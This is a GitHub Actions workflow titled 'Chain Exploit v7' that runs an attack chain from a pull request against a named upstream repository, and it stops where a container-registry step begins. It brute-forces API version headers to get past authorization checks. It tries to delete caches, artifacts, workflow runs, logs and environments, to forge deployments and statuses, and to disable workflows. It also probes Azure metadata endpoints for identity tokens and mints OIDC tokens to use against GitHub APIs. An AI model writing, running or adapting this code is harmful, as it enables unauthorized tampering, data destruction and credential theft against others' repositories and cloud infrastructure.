name: Chain Exploit v7
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  actions: write
  checks: write
  statuses: write
  deployments: write
  packages: write
  id-token: write
  issues: write
  pull-requests: write
  security-events: write

jobs:
  chain:
    runs-on: ubuntu-latest
    env:
      GH_TOKEN: ${{ github.token }}
      UP: https://api.github.com/repos/twrps/PoC-RACE2
      BASE: https://api.github.com/repos/lacaag/PoC-RACE2
      GQ: https://api.github.com/graphql
      PR_NUM: ${{ github.event.pull_request.number }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: 0 Setup + Extract
        id: setup
        run: |
          set +e
          TS=$(date +%Y%m%d_%H%M%S)
          git remote add upstream https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.git 2>/dev/null
          git fetch upstream 2>/dev/null
          FM=$(git rev-parse HEAD)
          FT=$(git rev-parse HEAD^{tree} 2>/dev/null || echo NONE)
          FG=$(git commit-tree $FT -m "ghost-v5-$TS" 2>/dev/null || echo NONE)
          UM=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP/git/refs/heads/main" | jq -r '.object.sha')
          UT=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP/git/commits/$UM" | jq -r '.tree.sha')
          RI=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP" | jq -r '.node_id')
          FRI=$(curl -sf -H "Authorization: token $GH_TOKEN" "$BASE" | jq -r '.node_id')
          GT=$(echo "$GH_TOKEN" | head -c 15)
          echo "TS=$TS" >> $GITHUB_ENV
          echo "FM=$FM" >> $GITHUB_ENV
          echo "FT=$FT" >> $GITHUB_ENV
          echo "FG=$FG" >> $GITHUB_ENV
          echo "UM=$UM" >> $GITHUB_ENV
          echo "UT=$UT" >> $GITHUB_ENV
          echo "RI=$RI" >> $GITHUB_ENV
          echo "FRI=$FRI" >> $GITHUB_ENV
          echo "GT=$GT" >> $GITHUB_ENV
          OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL:-}"
          OIDC_TOK="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
          echo "OIDC_URL=$OIDC_URL" >> $GITHUB_ENV
          echo "OIDC_TOK=$OIDC_TOK" >> $GITHUB_ENV
          echo "fm=$FM fg=$FG um=$UM ut=$UT ri=$RI fri=$FRI oidc=$([ -n \"$OIDC_URL\" ] && echo yes || echo no)"

      - name: 1 API Version Bypass Chain
        run: |
          set +e
          echo "=== API VERSION BYPASS ==="
          echo "v4 showed: invalid versions return 400 not 403 = version check BEFORE auth"
          echo "Testing every plausible version string to find one that passes version check but bypasses auth"
          echo ""
          echo "--- Exhaustive version scan ---"
          for V in \
            "2022-11-28" "2022-11-27" "2022-11-29" "2022-11-30" "2022-12-01" \
            "2023-01-01" "2023-06-01" "2023-11-28" "2023-12-01" \
            "2024-01-01" "2024-06-01" "2024-11-28" "2024-12-01" \
            "2025-01-01" "2025-06-01" "2025-11-28" "2025-12-01" \
            "2026-01-01" "2026-03-04" "2026-06-01" "2026-12-01" \
            "2027-01-01" "2030-01-01" \
            "1.0" "2.0" "3.0" "4.0" "v3" "v4" "v5" \
            "latest" "beta" "preview" "alpha" "canary" "next" "edge" \
            "2022-11-28-preview" "2022-11-28-beta" "2023-11-28-preview" \
            "ghec-2022-11-28" "ghes-3.9" "ghes-3.10" "ghes-3.11" "ghes-3.12" \
            "" "null" "undefined"; do
            R=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH \
              -H "Authorization: token $GH_TOKEN" \
              -H "Content-Type: application/json" \
              -H "X-GitHub-Api-Version: $V" \
              "$UP" -d '{"description":"v5-ver-test"}' 2>/dev/null)
            [ "$R" != "403" ] && echo "V5A ver='$V' PATCH repo = HTTP_$R ***ANOMALY***" || true
          done
          echo ""
          echo "--- Version + different endpoints ---"
          for V in "2022-11-28" "2023-11-28-preview" "latest" "beta" "ghec-2022-11-28"; do
            for EP in "git/blobs" "issues" "releases" "check-runs" "statuses/$UM" \
                      "deployments" "labels" "milestones" "hooks" "keys" \
                      "actions/secrets/TEST" "actions/variables" "environments/v5test"; do
              R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
                -H "Authorization: token $GH_TOKEN" \
                -H "Content-Type: application/json" \
                -H "X-GitHub-Api-Version: $V" \
                "$UP/$EP" -d '{"content":"x","encoding":"utf-8","title":"v5","name":"v5","tag_name":"v5","state":"success","head_sha":"'"$UM"'","context":"v5","key":"v5","description":"v5"}' 2>/dev/null)
              [ "$R" != "403" ] && echo "V5B ver='$V' ep=$EP = HTTP_$R ***ANOMALY***" || true
            done
          done
          echo ""
          echo "--- No version header at all ---"
          for EP in "" "/git/blobs" "/issues" "/check-runs" "/deployments" "/actions/caches"; do
            R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: token $GH_TOKEN" \
              -H "Content-Type: application/json" \
              "$UP$EP" -d '{"content":"x","encoding":"utf-8","title":"v5","head_sha":"'"$UM"'"}' 2>/dev/null)
            echo "V5C no-ver ep=$EP = HTTP_$R"
          done

      - name: 2 Cache Poisoning Chain
        run: |
          set +e
          echo "=== CACHE EXPLOITATION ==="
          echo "v4 showed: actions/caches = READ 200, POST caches = 404 (not 403!)"
          echo ""
          echo "--- Read upstream caches ---"
          CACHES=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP/actions/caches" 2>/dev/null)
          echo "W01 total_count: $(echo "$CACHES" | jq '.total_count' 2>/dev/null)"
          echo "W01 cache keys: $(echo "$CACHES" | jq -r '.actions_caches[].key' 2>/dev/null | head -20)"
          echo "W01 cache ids: $(echo "$CACHES" | jq -r '.actions_caches[].id' 2>/dev/null | head -20)"
          echo ""
          echo "--- Try DELETE individual caches ---"
          for CID in $(echo "$CACHES" | jq -r '.actions_caches[].id' 2>/dev/null | head -5); do
            R=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE \
              -H "Authorization: token $GH_TOKEN" \
              "$UP/actions/caches/$CID" 2>/dev/null)
            echo "W02 DELETE cache/$CID = HTTP_$R"
          done
          echo ""
          echo "--- Try DELETE by key ---"
          for KEY in $(echo "$CACHES" | jq -r '.actions_caches[].key' 2>/dev/null | head -5); do
            R=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE \
              -H "Authorization: token $GH_TOKEN" \
              "$UP/actions/caches?key=$(echo $KEY | sed 's/ /%20/g')" 2>/dev/null)
            echo "W03 DELETE key=$KEY = HTTP_$R"
          done
          echo ""
          echo "--- Cache reserve via internal API ---"
          echo "Trying all known cache API URL patterns"
          for CBASE in \
            "https://artifactcache.actions.githubusercontent.com" \
            "https://artifactcache-westus.actions.githubusercontent.com" \
            "https://vstoken.actions.githubusercontent.com" \
            "https://results-receiver.actions.githubusercontent.com" \
            "https://pipelines.actions.githubusercontent.com"; do
            R=$(curl -s -o /dev/null -w "%{http_code}" -m3 \
              -H "Authorization: Bearer $GH_TOKEN" \
              "$CBASE/_apis/artifactcache/caches" 2>/dev/null)
            R2=$(curl -s -o /dev/null -w "%{http_code}" -m3 -X POST \
              -H "Authorization: Bearer $GH_TOKEN" \
              -H "Content-Type: application/json" \
              "$CBASE/_apis/artifactcache/caches" \
              -d '{"key":"v5-poison","version":"1"}' 2>/dev/null)
            echo "W04 $CBASE: GET=$R POST=$R2"
          done
          echo ""
          echo "--- Fork cache -> upstream cache cross-read ---"
          FCACHES=$(curl -sf -H "Authorization: token $GH_TOKEN" "$BASE/actions/caches" 2>/dev/null)
          echo "W05 fork caches: $(echo "$FCACHES" | jq '.total_count' 2>/dev/null)"

      - name: 3 Artifact Exploitation Chain
        run: |
          set +e
          echo "=== ARTIFACT EXPLOITATION ==="
          echo "v4 showed: actions/artifacts = READ 200"
          echo ""
          echo "--- List upstream artifacts ---"
          ARTS=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP/actions/artifacts?per_page=100" 2>/dev/null)
          echo "X01 total: $(echo "$ARTS" | jq '.total_count' 2>/dev/null)"
          echo "X01 artifacts:"
          echo "$ARTS" | jq -r '.artifacts[] | "\(.id) \(.name) \(.size_in_bytes) \(.expired)"' 2>/dev/null | head -20
          echo ""
          echo "--- Try download each artifact ---"
          for AID in $(echo "$ARTS" | jq -r '.artifacts[].id' 2>/dev/null | head -10); do
            R=$(curl -s -o /dev/null -w "%{http_code}" -L \
              -H "Authorization: token $GH_TOKEN" \
              "$UP/actions/artifacts/$AID/zip" 2>/dev/null)
            echo "X02 download artifact/$AID = HTTP_$R"
          done
          echo ""
          echo "--- Try DELETE artifacts ---"
          for AID in $(echo "$ARTS" | jq -r '.artifacts[].id' 2>/dev/null | head -5); do
            R=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE \
              -H "Authorization: token $GH_TOKEN" \
              "$UP/actions/artifacts/$AID" 2>/dev/null)
            echo "X03 DELETE artifact/$AID = HTTP_$R"
          done
          echo ""
          echo "--- Upstream workflow runs detail ---"
          RUNS=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP/actions/runs?per_page=10" 2>/dev/null)
          echo "X04 runs:"
          echo "$RUNS" | jq -r '.workflow_runs[] | "\(.id) \(.name) \(.status) \(.conclusion)"' 2>/dev/null | head -10
          echo ""
          echo "--- Try re-run upstream workflows ---"
          for RID in $(echo "$RUNS" | jq -r '.workflow_runs[].id' 2>/dev/null | head -3); do
            R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: token $GH_TOKEN" \
              "$UP/actions/runs/$RID/rerun" 2>/dev/null)
            echo "X05 rerun $RID = HTTP_$R"
            R2=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: token $GH_TOKEN" \
              "$UP/actions/runs/$RID/cancel" 2>/dev/null)
            echo "X06 cancel $RID = HTTP_$R2"
            R3=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: token $GH_TOKEN" \
              "$UP/actions/runs/$RID/rerun-failed-jobs" 2>/dev/null)
            echo "X07 rerun-failed $RID = HTTP_$R3"
            R4=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE \
              -H "Authorization: token $GH_TOKEN" \
              "$UP/actions/runs/$RID" 2>/dev/null)
            echo "X08 DELETE run $RID = HTTP_$R4"
            R5=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE \
              -H "Authorization: token $GH_TOKEN" \
              "$UP/actions/runs/$RID/logs" 2>/dev/null)
            echo "X09 DELETE logs $RID = HTTP_$R5"
          done
          echo ""
          echo "--- Try trigger upstream workflow dispatch ---"
          WFS=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP/actions/workflows" 2>/dev/null)
          echo "X10 workflows:"
          echo "$WFS" | jq -r '.workflows[] | "\(.id) \(.name) \(.path)"' 2>/dev/null
          for WID in $(echo "$WFS" | jq -r '.workflows[].id' 2>/dev/null | head -5); do
            R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: token $GH_TOKEN" \
              -H "Content-Type: application/json" \
              "$UP/actions/workflows/$WID/dispatches" \
              -d '{"ref":"main","inputs":{}}' 2>/dev/null)
            echo "X11 dispatch wf/$WID = HTTP_$R"
            R2=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
              -H "Authorization: token $GH_TOKEN" \
              "$UP/actions/workflows/$WID/disable" 2>/dev/null)
            echo "X12 disable wf/$WID = HTTP_$R2"
          done

      - name: 4 Deployment + Environment Chain
        run: |
          set +e
          echo "=== DEPLOYMENT + ENVIRONMENT CHAIN ==="
          echo "v4 showed: deployments=200, environments=200"
          echo ""
          echo "--- Read upstream deployments ---"
          DEPS=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP/deployments?per_page=100" 2>/dev/null)
          echo "Y01 deployments:"
          echo "$DEPS" | jq -r '.[] | "\(.id) \(.ref) \(.environment) \(.creator.login)"' 2>/dev/null | head -20
          echo ""
          echo "--- Read upstream environments ---"
          ENVS=$(curl -sf -H "Authorization: token $GH_TOKEN" "$UP/environments" 2>/dev/null)
          echo "Y02 environments:"
          echo "$ENVS" | jq -r '.environments[] | "\(.id) \(.name) \(.protection_rules)"' 2>/dev/null | head -20
          echo ""
          echo "--- Try create deployments with every method ---"
          for ENV in "production" "staging" "development" "v5-test"; do
            for REF in "main" "$UM" "$FG" "refs/heads/main" "refs/pull/$PR_NUM/merge"; do
              R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
                -H "Authorization: token $GH_TOKEN" \
                -H "Content-Type: application/json" \
                "$UP/deployments" \
                -d "{\"ref\":\"$REF\",\"environment\":\"$ENV\",\"auto_merge\":false,\"required_contexts\":[]}" 2>/dev/null)
              [ "$R" != "403" ] && echo "Y03 deploy env=$ENV ref=$REF = HTTP_$R ***ANOMALY***" || true
            done
          done
          echo ""
          echo "--- Try create/update deployment status on existing ---"
          for DID in $(echo "$DEPS" | jq -r '.[].id' 2>/dev/null | head -5); do
            for STATE in "success" "failure" "error" "inactive" "in_progress" "queued" "pending"; do
              R=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
                -H "Authorization: token $GH_TOKEN" \
                -H "Content-Type: application/json" \
                "$UP/deployments/$DID/statuses" \
                -d "{\"state\":\"$STATE\",\"description\":\"v5-chain\"}" 2>/dev/null)
              [ "$R" != "403" ] && echo "Y04 status dep=$DID state=$STATE = HTTP_$R ***ANOMALY***" || true
            done
          done
          echo ""
          echo "--- Try PUT environments ---"
          for ENV in "v5-escape" "production" "staging" "development" "github-pages"; do
            R=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
              -H "Authorization: token $GH_TOKEN" \
              -H "Content-Type: application/json" \
              "$UP/environments/$ENV" -d '{}' 2>/dev/null)
            [ "$R" != "403" ] && echo "Y05 PUT env=$ENV = HTTP_$R ***ANOMALY***" || true
          done
          echo ""
          echo "--- Try DELETE environments ---"
          for ENAME in $(echo "$ENVS" | jq -r '.environments[].name' 2>/dev/null | head -5); do
            R=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE \
              -H "Authorization: token $GH_TOKEN" \
              "$UP/environments/$ENAME" 2>/dev/null)
            [ "$R" != "403" ] && echo "Y06 DELETE env=$ENAME = HTTP_$R ***ANOMALY***" || true
          done

      - name: 5 SSRF via Internal Services
        run: |
          set +e
          echo "=== SSRF VIA INTERNAL SERVICES ==="
          echo "v4 showed: vstoken=302/404, results-receiver=301/404, pipelines=302/404, IMDS=400"
          echo ""
          echo "--- Deep IMDS SSRF ---"
          AZ="http://169.254.169.254"
          echo "S01 IMDS with different headers:"
          for HDR in "Metadata: true" "Metadata: True" "Metadata: TRUE" "Metadata: 1" \
                     "X-Metadata: true" "X-IDENTITY-HEADER: true" "X-ms-identity: true"; do
            R=$(curl -sf -m3 -H "$HDR" "${AZ}/metadata/instance?api-version=2021-02-01" 2>/dev/null | head -c 80)
            [ -n "$R" ] && echo "S01 HDR='$HDR': $R"
          done
          echo ""
          echo "--- IMDS identity with MSI_ENDPOINT patterns ---"
          for RES in \
            "https://management.azure.com/" \
            "https://vault.azure.net" \
            "https://graph.microsoft.com/" \
            "https://storage.azure.com/" \
            "https://database.windows.net/" \
            "https://dev.azure.com" \
            "https://github.com" \
            "https://api.github.com" \
            "https://vstoken.actions.githubusercontent.com" \
            "https://pipelines.actions.githubusercontent.com"; do
            for VER in "2019-08-01" "2021-02-01" "2023-07-01"; do
              R=$(curl -sf -m3 -H "Metadata: true" \
                "${AZ}/metadata/identity/oauth2/token?api-version=$VER&resource=$RES" 2>/dev/null)
              if [ -n "$R" ] && ! echo "$R" | grep -q '"error"'; then
                echo "S02 IMDS token resource=$RES ver=$VER: $(echo $R | head -c 100) ***GOT TOKEN***"
              fi
            done
          done
          echo ""
          echo "--- Wire server (168.63.129.16) deep probe ---"
          for PORT in 80 32526 443 8080; do
            for WPATH in "/" "/machine" "/machine/plugins" "/machine/plugins/?comp=nmagent&type=getinterfaceinfov1" \
              "/healthcheck" "/status" "/?comp=goalstate" "/?comp=config&incarnation=1"; do
              R=$(curl -sf -m3 "http://168.63.129.16:${PORT}${WPATH}" 2>/dev/null | head -c 100)
              [ -n "$R" ] && echo "S03 wire ${PORT}${WPATH}: $R" || true
            done
          done
          echo ""
          echo "--- vstoken service deep probe ---"
          VHOST="vstoken.actions.githubusercontent.com"
          echo "S04 vstoken paths:"
          for P in "/" "/_apis" "/_apis/connectionData" "/_apis/token" "/_apis/token/session" \
            "/oauth2/token" "/token" "/.well-known/openid-configuration" \
            "/_apis/distributedtask" "/_apis/pipelines"; do
            R=$(curl -sf -m3 "https://${VHOST}${P}" 2>/dev/null | head -c 150)
            RC=$(curl -s -o /dev/null -m3 -w "%{http_code}" "https://${VHOST}${P}" 2>/dev/null)
            echo "S04 ${P}: HTTP_${RC} $(echo $R | head -c 100)"
          done
          echo ""
          echo "--- vstoken with runtime token ---"
          for P in "/" "/_apis/connectionData" "/_apis/distributedtask/serviceinterfaces" \
            "/_apis/token/session/token"; do
            R=$(curl -sf -m3 -H "Authorization: Bearer $GH_TOKEN" "https://${VHOST}${P}" 2>/dev/null | head -c 150)
            RC=$(curl -s -o /dev/null -m3 -w "%{http_code}" -H "Authorization: Bearer $GH_TOKEN" "https://${VHOST}${P}" 2>/dev/null)
            echo "S05 ${P}: HTTP_${RC} $(echo $R | head -c 100)"
          done
          echo ""
          echo "--- pipelines service ---"
          PHOST="pipelines.actions.githubusercontent.com"
          for P in "/" "/_apis/pipelines" "/_apis/distributedtask" "/api" "/oauth2" "/.well-known"; do
            RC=$(curl -s -o /dev/null -m3 -w "%{http_code}" "https://${PHOST}${P}" 2>/dev/null)
            R=$(curl -sf -m3 "https://${PHOST}${P}" 2>/dev/null | head -c 100)
            echo "S06 ${P}: HTTP_${RC} $R"
          done
          echo ""
          echo "--- results-receiver service ---"
          RHOST="results-receiver.actions.githubusercontent.com"
          for P in "/" "/_apis" "/api" "/twrps/PoC-RACE2" "/results"; do
            RC=$(curl -s -o /dev/null -m3 -w "%{http_code}" "https://${RHOST}${P}" 2>/dev/null)
            R=$(curl -sf -m3 "https://${RHOST}${P}" 2>/dev/null | head -c 100)
            echo "S07 ${P}: HTTP_${RC} $R"
          done

      - name: 6 OIDC as GitHub Auth Chain
        run: |
          set +e
          echo "=== OIDC TOKEN AS GITHUB API AUTH ==="
          echo "v4 showed: JWTs obtainable for ANY audience including api.github.com"
          echo ""
          echo "--- Get OIDC JWT for github.com audience ---"
          if [ -n "$OIDC_URL" ]; then
            for AUD in "api.github.com" "github.com" "https://github.com" "https://api.github.com" \
              "vstoken.actions.githubusercontent.com" "pipelines.actions.githubusercontent.com" \
              "results-receiver.actions.githubusercontent.com" "token.actions.githubusercontent.com" \
              "ghcr.io" "npm.pkg.github.com" "*.github.com" "*.githubusercontent.com"; do
              JWT=$(curl -sf -H "Authorization: bearer $OIDC_TOK" \
                "${OIDC_URL}&audience=$AUD" 2>/dev/null | jq -r '.value // empty' 2>/dev/null)
              if [ -n "$JWT" ]; then
                echo "T01 JWT for $AUD: $(echo $JWT | wc -c) chars"
                echo "--- Try JWT as GitHub API bearer ---"
                R=$(curl -s -o /dev/null -w "%{http_code}" \
                  -H "Authorization: Bearer $JWT" \
                  "$UP/git/blobs" -X POST \
                  -H "Content-Type: application/json" \
                  -d '{"content":"oidc-escape","encoding":"utf-8"}' 2>/dev/null)
                echo "T02 aud=$AUD upstream blob = HTTP_$R"
                [ "$R" != "403" ] && [ "$R" != "401" ] && echo "***ANOMALY*** aud=$AUD returned $R"
                R2=$(curl -s -o /dev/null -w "%{http_code}" \
                  -H "Authorization: Bearer $JWT" \
                  "$UP" -X PATCH \
                  -H "Content-Type: application/json" \
                  -d '{"description":"oidc-v5"}' 2>/dev/null)
                [ "$R2" != "403" ] && [ "$R2" != "401" ] && echo "***ANOMALY*** PATCH aud=$AUD returned $R2"
                R3=$(curl -s -o /dev/null -w "%{http_code}" \
                  -H "Authorization: Bearer $JWT" \
                  "$UP/check-runs" -X POST \
                  -H "Content-Type: application/json" \
                  -d "{\"name\":\"oidc-v5\",\"head_sha\":\"$UM\",\"status\":\"completed\",\"conclusion\":\"success\"}" 2>/dev/null)
                [ "$R3" != "403" ] && [ "$R3" != "401" ] && echo "***ANOMALY*** check-run aud=$AUD returned $R3"
                echo "--- Try JWT against vstoken ---"
                R4=$(curl -s -o /dev/null -w "%{http_code}" -m3 \
                  -H "Authorization: Bearer $JWT" \
                  "https://vstoken.actions.githubusercontent.com/_apis/connectionData" 2>/dev/null)
                [ "$R4" != "404" ] && [ "$R4" != "000" ] && echo "T03 vstoken with aud=$AUD JWT = HTTP_$R4 ***INTERESTING***"
                echo "--- Try JWT against pipelines ---"
                R5=$(curl -s -o /dev/null -w "%{http_code}" -m3 \
                  -H "Authorization: Bearer $JWT" \
                  "https://pipelines.actions.githubusercontent.com/_apis/pipelines" 2>/dev/null)
                { [ "$R5" != "404" ] && [ "$R5" != "000" ] && echo "T04 pipelines with aud=$AUD JWT = HTTP_$R5 ***INTERESTING***"; } || true
              else
                echo "T01 JWT for $AUD: FAILED"
              fi
            done
          else
            echo "OIDC not available"
          fi

      - name: 7 GHCR Cross-Mount Exploit
        run: |
          set +e
          echo "=== GHCR CROSS-MOUNT EXPLOITATION ==="
